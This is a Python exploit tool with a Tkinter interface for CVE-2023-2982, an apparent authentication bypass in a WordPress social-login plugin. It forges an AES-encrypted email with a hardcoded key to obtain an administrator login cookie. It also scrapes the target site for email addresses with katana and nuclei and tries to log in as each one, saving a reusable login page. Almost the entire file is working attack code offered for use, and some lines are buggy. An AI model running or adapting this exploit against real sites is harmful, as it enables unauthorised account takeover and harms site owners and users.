#!/usr/bin/python3

import sys
import getopt
import requests
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import argparse
import random
import string
import requests
import json
import lxml.etree as ET
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
def Apachey():
    root = tkinter.Tk()
    root.title("CVE-2023-2982 exploits")
    root.geometry('800x600+0+0')
    def printInput():
        inp = inputtxt.get(1.0, "end-1c")
        lbl.config(text = "attack url : "+inp)
        website_url = inp
        email = 'admin@gmail,com'
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        session = requests.Session()
        passphrase = 'jMj7MEdu4wkHObiD'


# Setting User-Agent for all requests.
        user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
        session.headers.update({'User-Agent': user_agent})
        random_string = ''.join(random.choices(string.digits, k=4))


        def try_login(website_url,email):
    # format url
            website_url = website_url.rstrip('\/') + '/'
            cipher = AES.new(passphrase.encode('utf-8'), AES.MODE_ECB)
            padded_email = pad(email.encode('utf-8'), AES.block_size)
            encrypted_email = cipher.encrypt(padded_email)
            encoded_email = base64.b64encode(encrypted_email).decode('utf-8')
    # post moopenid
            try:
                response = session.post(website_url, headers={'Content-Type': 'application/x-www-form-urlencoded'},data={'option': 'moopenid', 'email': encoded_email, 'appName': 'rlHeqZw2vrPzOiWWfCParA=='},allow_redirects=False,verify=False,timeout=10)

                if any('wordpress_logged_in' in cookie.name for cookie in session.cookies):
          # Opening the file and replacing the desired strings
                    with open("login.html", 'r') as file:
                        file_content = file.read()
                        replaced_content = file_content.replace('WEBSITE_REPLACE', website_url).replace('EMAIL_REPLACE', encoded_email)
               # Writing the updated content back to the file
                        with open("login-"+random_string+".html", 'w') as file:
                            file.write(replaced_content)
                            scroll_y = Scrollbar(root, orient=VERTICAL)
                            txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                            scroll_y.pack(side=RIGHT, fill=Y)
                            scroll_y.config(command=txtarea.yview)
                            txtarea.insert(END, "Login Worked!")
                            txtarea.insert(END, "To Login again open login-"+random_string+".html")
                            txtarea.pack(fill=BOTH, expand=True)
                            txtarea.configure(state ='disabled')
                          #  print("Login Worked!")
                           # print("To Login again open login-"+random_string+".html")
                            os.system("open login-"+random_string+".html")
               
                else:
                    scroll_y = Scrollbar(root, orient=VERTICAL)
                    txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                    scroll_y.pack(side=RIGHT, fill=Y)
                    scroll_y.config(command=txtarea.yview)
                    txtarea.insert(END, "Login Failed with "+email+"")
                    txtarea.pack(fill=BOTH, expand=True)
                    txtarea.configure(state ='disabled')
              #     print("Login Failed with "+email+"")
            except requests.exceptions.RequestException as e:
                scroll_y = Scrollbar(root, orient=VERTICAL)
                txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                scroll_y.pack(side=RIGHT, fill=Y)
                scroll_y.config(command=txtarea.yview)
                txtarea.insert(END, 'Error occurred while logging in:')
                txtarea.insert(END, str(e))
                txtarea.pack(fill=BOTH, expand=True)
                txtarea.configure(state ='disabled')
                  # print('Error occurred while logging in:', str(e))

        def scan_and_extract(website_url):
            scroll_y = Scrollbar(root, orient=VERTICAL)
            txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
            scroll_y.pack(side=RIGHT, fill=Y)
            scroll_y.config(command=txtarea.yview)
            txtarea.insert(END, "Crawling "+website_url+" for email addresses.")
           # print("Crawling "+website_url+" for email addresses.")
            cmd = "katana -u "+website_url+" -o /tmp/katana.txt"
            cmd2 = "nuclei --silent -l /tmp/katana.txt -t http/miscellaneous/email-extractor.yaml -nc -nm -fr -o /tmp/nuc.txt"
    #os.system(cmd)
           # print("Using Nuclei to extract emails from links")
            txtarea.insert(END, "Using Nuclei to extract emails from links")
            txtarea.pack(fill=BOTH, expand=True)
            txtarea.configure(state ='disabled')
            os.system(cmd2)
            with open("nuc.txt", "r") as f:
                lines = f.readlines()
            emails = set()
            for line in lines:
                matches = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', line)
                emails.update(matches)
            with open("nuc.txt", "w") as f:
                for email in emails:
                    f.write(email + "\n")
                    try_login(website_url,email)
        try_login(website_url,email)
        scan_and_extract(website_url)

    Hacher = Label(root, text="Enter url or domin https://www.example.com/api/v3 : ").pack()
    inputtxt = tk.Text(root,height = 1,width = 80)
    inputtxt.pack()
    printButton = tk.Button(root,text = "exploit", command = printInput)
    printButton.pack()
    lbl = tk.Label(root, text = "")
    lbl.pack()
    root.mainloop()
'''
def main():
    parser = argparse.ArgumentParser(description='CVE-2023-2982.py')
    parser.add_argument('-w', '--website_url', required=True,help='Website URL')
    parser.add_argument('-e', '--email',required=False, help='Email')
    args = parser.parse_args()
    website_url = args.website_url
    email = args.email
    if args.email:
       try_login(website_url,email)
    else:
       scan_and_extract(website_url)
    
    


if __name__ == "__main__":
    main()
'''
